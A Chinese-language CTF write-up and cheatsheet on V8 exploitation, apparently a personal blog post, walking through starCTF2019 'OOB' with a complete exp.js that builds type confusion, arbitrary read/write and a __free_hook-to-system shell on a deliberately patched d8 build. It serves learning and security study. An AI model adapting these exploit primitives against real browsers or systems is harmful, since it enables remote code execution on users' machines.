> 之前一直对v8有所耳闻却没仔细看过, 这下比赛里被锤烂了, 坐大牢

## v8-pwn-cheatsheet

#### Installation

chrome中JavaScript的解释器被称为V8, 下载的V8源码经过编译后得到可执行文件d8, 而d8往往又分为`debug`和`release`版本.

先是下载源码:

- 安装`depot_tools`用于下载V8源码: `git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git`
- `echo 'export PATH=$PATH:"/root/depot_tools"' >> ~/.zshrc`
- 安装`ninja`用于编译V8: `git clone https://github.com/ninja-build/ninja.git`
- `cd ninja && ./configure.py --bootstrap && cd ..`
- `echo 'export PATH=$PATH:"/root/ninja"' >> ~/.zshrc`
- `source ~/.zshrc`
- `fetch v8`

接下来编译:

- `cd v8 && gclient sync`
- `tools/dev/v8gen.py x64.debug`
- `ninja -C out.gn/x64.debug `

最后选择导出路径:

- `./out.gn/x64.debug/d8`
- `./out.gn/x64.debug/v8_shell`

#### Patch

题目一般会给出有漏洞版本的`commit-id`, 因此编译之前需要把源码版本先patch到目标版本:

```shell
git reset --hard 6dc88c191f5ecc5389dc26efa3ca0907faef3598
gclient sync
git apply < oob.diff
tools/dev/v8gen.py x64.debug
ninja -C out.gn/x64.debug d8
tools/dev/v8gen.py x64.release
ninja -C out.gn/x64.release d8
```

#### Debug

在`./v8/tools/gdbinit`中提供了便于调试V8的gdb脚本, 主要提供了`job`指令

调试时需要打开`allow-natives-syntax`选项:

```shell
gdb ./d8
set args --allow-natives-syntax
r
source ~/.gdbinit_v8
```

##### gdb

- telescope [addr] [length]
  - 查看目标地址内存数据
- job [addr]
  - 显示JavaScript对象的内存结构

**V8在内存中只有数字和对象两种数据结构的表示, 为了区分, 内存地址最低位是1则表示该地址上的数据结构是对象**

**即指针标记机制, 用来区分指针,双精度数,和SMIS( immediate small integer )**

```
Double: Shown as the 64-bit binary representation without any changes
Smi: Represented as value << 32, i.e 0xdeadbeef is represented as 0xdeadbeef00000000
Pointers: Represented as addr & 1. 0x2233ad9c2ed8 is represented as 0x2233ad9c2ed9
```

##### JavaScript

- %DebugPrint(obj)
  - 查看对象地址
- %SystemBreak()
  - 触发调试中断结合gdb使用

##### 对象结构

V8本质上是一个JavaScript解释执行器, 基本执行流程为:

v8在读取js语句后, 首先将这一条语句解析为语法树, 然后通过解释器将语法树变为中间语言的Bytecode字节码, 最后利用内部虚拟机将字节码转换为机器码来执行.

JIT优化:

v8会记录下某条语法树的执行次数, 当v8发现某条语法树执行次数超过一定阀值后, 就会将这段语法树直接转换为机器码.

后续再调用这条js语句时, v8会直接调用这条语法树对应的机器码, 而不用再转换为ByteCode字节码, 这样就大大加快了执行速度

```
map: 定义了如何访问对象
prototype：	对象的原型（如果有）
elements：对象元素的地址
length：长度
properties：	属性, 存有map和length
```

其中, elements也是个对象( 指向数组对象上方的指针 ), 即v8先申请了一块内存存储元素内容, 然后申请了一块内存存储这个数组的对象结构, 对象中的elements指向了存储元素内容的内存地址

#### CTF-chals

##### example0-starCTF2019-OOB

这道题也算是V8题目中比较经典的例题了, 题目附件: [starctf2019-pwn-OOB](https://github.com/sixstars/starctf2019/tree/master/pwn-OOB):

```shell
fetch v8
cd v8
git reset --hard 6dc88c191f5ecc5389dc26efa3ca0907faef3598
gclient sync
git apply < oob.diff
tools/dev/v8gen.py x64.debug
ninja -C out.gn/x64.debug d8
tools/dev/v8gen.py x64.release
ninja -C out.gn/x64.release d8
```

这里有一点需要注意的是, 我们现在编译的debug版本调用obj.oob()时会触发异常退出, 因此只能在release版本下进行利用, debug版本下调试帮助理解JavaScript对象结构.

题目的漏洞点体现在oob.diff文件中:

```diff
...
line 33:    return *(isolate->factory()->NewNumber(elements.get_scalar(length)));
...
line 39:    elements.set(length,value->Number());
...
```

即无论是读还是写, oob方法都索引到了`elements[length]`的位置, 造成了数组越界漏洞.

在具体利用时, 还是遵循着pwn题目的基本思路:

```
漏洞
     -> 类型混淆
                 -> 任意地址读写
                                 -> 泄露相关地址
                                                 -> shellcode || hook_hijacking
```

先来看几个类型转换的辅助函数:

```JavaScript
var buf = new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);

function f2i( f ) {
// 浮点数表示为u64
    float64[0] = f;
    return bigUint64[0];
}
function i2f( i ) {
// u64直接表示为浮点数
    bigUint64[0] = i;
    return float64[0];
}
function hex( x ) {
    return x.toString(16).padStart(16, "0");
}
```

接下来是利用oob()实现类型混淆的思路:

- 首先需要明白: JavaScript中对于对象( [对象结构的复习](#对象结构) )的解析依赖于`map`: map指向`<Map(PACKED_ELEMENTS)>`时elements中元素就会按照obj来解析...其他类型同理;
- 而oob()不带参数( `args.at<Object>(0)`永远是self ), 就可以输出`elements[length]`, oob(data)就可以在`elements[length]`写入data;
- array的elements也是对象, 在内存结构中, 往往体现为: elements紧挨着array, 即: elements[length]的位置上就是array的`map`!!
- 因此可以考虑先读出map, 再在另一种array的map处写入, 即实现了类型混淆.

demo如下:

```JavaScript
var obj = {};
var obj_list = [obj];
var float_list = [4.3];

var obj_map = obj_list.oob();
var float_map = float_list.oob();

obj_list.oob(float_map);
var obj_addr = f2i(obj_list[0]) - 0x1n;
obj_list.oob(obj_map);
console.log("[DEMO] addr of obj is: 0x" + hex(obj_addr));
%DebugPrint(obj);
%SystemBreak();
```

这样一来, 我们就可以开始考虑构造任意地址写了, 思路如下:

- 首先, 在JavaScript中浮点数在内存中是直接存储的, 因此伪造`float_array`是比较合适的;
- 目标是通过在`fake_float_array`这个对象的`elements`的基础上使用`get_obj()`函数构建假的`float_array`
- 如此一来, 当访问到`fake_array[0]`的时候, 实际上会根据其map设定的访问规则, 最终访问到`target_addr+10`也是`fake_float_array[2]`的位置上.

文字描述还是有点绕, 测试代码如下:

```JavaScript
// arbitary read and write
function get_addr( target_obj ) {
    obj_list[0] = target_obj;
    obj_list.oob(float_map);
    let res = f2i(obj_list[0]) - 1n;
    obj_list.oob(obj_map);
    return res;
}
function get_obj( target_addr ) {
    float_list[0] = i2f(target_addr + 1n);
    float_list.oob(obj_map);
    let res = float_list[0];
    float_list.oob(float_map);
    return res;
}

var fake_float_array = [
    float_map,
    i2f(0n),
    i2f(0xdeadbeefn),
    i2f(0x400000000n),
    4.3,
    4.3
];
var fake_array_addr = get_addr(fake_float_array);
var fake_elements_addr = fake_array_addr - 0x30n;
var fake_obj = get_obj(fake_elements_addr);

function arb_read( target_addr ) {
    fake_float_array[2] = i2f(target_addr - 0x10n + 1n);
    let res = f2i(fake_obj[0]);
    console.log("[SUCCESS] data from 0x" + hex(target_addr) + " is: 0x" + hex(res));
    return res;
}
function arb_write( target_addr, data ) {
    fake_float_array[2] = i2f(target_addr - 0x10n + 1n);
    fake_obj[0] = i2f(data);
    console.log("[SUCCESS] written to 0x" + hex(target_addr) + " with: 0x" + hex(data));
}

// test_demos
var a = [0.1, 0.2, 0.3, 1.0, 4.3];
var test_addr = get_addr(a) - 0x18n;
%DebugPrint(a);
arb_write(test_addr, 0xdeadbeefn);
console.log(a[2]);
%DebugPrint(a);
%SystemBreak();
```

但是上面使用FloatArray进行写入的时候, 在目标地址高位是0x7f等情况下, 会出现低20位被置零的现象, 可以通过DataView的利用来解决:

- DataView对象中的有如下指针关系: `DataView -> buffer -> backing_store -> 存储内容` , 即`backing_store`指针指向了DataView申请的Buffer真正的内存地址;

改进如下:

```JavaScript
var data_buf = new ArrayBuffer(8);
var data_view = new DataView(data_buf);
var buf_backing_store_addr = addressOf(data_buf) + 0x20n;
function writeDataview( addr, data ) {
    arb_write(buf_backing_store_addr, addr);
    data_view.setBigUint64(0, data, true);
    console.log("[*] write to : 0x" +hex(addr) + ": 0x" + hex(data));
}
```

综上, 现在已经实现了任意地址写, 本地getshell还是考虑借助libc中的freehook, 至于地址泄露, 往前找肯定会存在我们需要的地址, 我们拥有很强的任意地址读写, 所以这不是一件难事:

exp.js:

```JavaScript

// auxiliary funcs to convert between doubles and u64s
var buf = new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);

function f2i( f ) {
    float64[0] = f;
    return bigUint64[0];
}
function i2f( i ) {
    bigUint64[0] = i;
    return float64[0];
}
function hex( x ) {
    return x.toString(16).padStart(16, "0");
}


// type confusion demo
var obj = {};
var obj_list = [obj];
var float_list = [4.3];

var obj_map = obj_list.oob();
var float_map = float_list.oob();

// obj_list.oob(float_map);
// var obj_addr = f2i(obj_list[0]) - 0x1n;
// obj_list.oob(obj_map);
// console.log("[DEMO] addr of obj is: 0x" + hex(obj_addr));
// %DebugPrint(obj);
// %SystemBreak();


// arbitary read and write
function get_addr( target_obj ) {
    obj_list[0] = target_obj;
    obj_list.oob(float_map);
    let res = f2i(obj_list[0]) - 1n;
    obj_list.oob(obj_map);
    return res;
}
function get_obj( target_addr ) {
    float_list[0] = i2f(target_addr + 1n);
    float_list.oob(obj_map);
    let res = float_list[0];
    float_list.oob(float_map);
    return res;
}

var fake_float_array = [
    float_map,
    i2f(0n),
    i2f(0xdeadbeefn),
    i2f(0x400000000n),
    4.3,
    4.3
];
var fake_array_addr = get_addr(fake_float_array);
var fake_elements_addr = fake_array_addr - 0x30n;
var fake_obj = get_obj(fake_elements_addr);

function arb_read( target_addr ) {
    fake_float_array[2] = i2f(target_addr - 0x10n + 1n);
    let res = f2i(fake_obj[0]);
    console.log("[SUCCESS] data from 0x" + hex(target_addr) + " is: 0x" + hex(res));
    return res;
}
function arb_write( target_addr, data ) {
    fake_float_array[2] = i2f(target_addr - 0x10n + 1n);
    fake_obj[0] = i2f(data);
    console.log("[SUCCESS] written to 0x" + hex(target_addr) + " with: 0x" + hex(data));
}

// test_demos
// var a = [0.1, 0.2, 0.3, 1.0, 4.3];
// var test_addr = get_addr(a) - 0x18n;
// %DebugPrint(a);
// arb_write(test_addr, 0xdeadbeefn);
// console.log(a[2]);
// %DebugPrint(a);
// %SystemBreak();

var data_buf = new ArrayBuffer(8);
var data_view = new DataView(data_buf);
var buf_backing_store_addr = get_addr(data_buf) + 0x20n;
function writeDataview(addr,data){
    arb_write(buf_backing_store_addr, addr);
    data_view.setBigUint64(0, data, true);
    console.log("[*] write to : 0x" +hex(addr) + ": 0x" + hex(data));
}

// leak libc
var a = [0.1, 0.2, 0.3, 1.0, 4.3];
var start_addr = get_addr(a);
var elf_addr = 0n;
while ( 1 ) {
    start_addr -= 0x8n;
    elf_addr = arb_read(start_addr);
    if (((elf_addr & 0xff0000000000n) == 0x560000000000n && (elf_addr & 0x1n) == 0) || ((elf_addr & 0xff0000000000n) == 0x550000000000n && (elf_addr & 0x1n) == 0)) {
        console.log("0x" + hex(elf_addr));
        break;
    }
}
console.log("done");

start_addr = elf_addr;
var libc_addr = 0n;
var suffix = 0x0;
while (1) {
    start_addr += 0x8n;
    libc_addr = arb_read(start_addr);
    if (((libc_addr & 0xff0000000000n) == 0x7f0000000000n)) {
        console.log("0x" + hex(libc_addr));
        suffix = (libc_addr & 0xfffn);
        break;
    }
}

var libc_base = libc_addr - 0x1ec000n - suffix;
var free_hook_addr = libc_base + 0x1eee48n;
var system_addr = libc_base + 0x52290n;
console.log("[+] libc_base : 0x" + hex(libc_base));
// %SystemBreak();
function exp() {
    var aaa = "/bin/sh\x00";
}
writeDataview(free_hook_addr, system_addr);
exp();

```

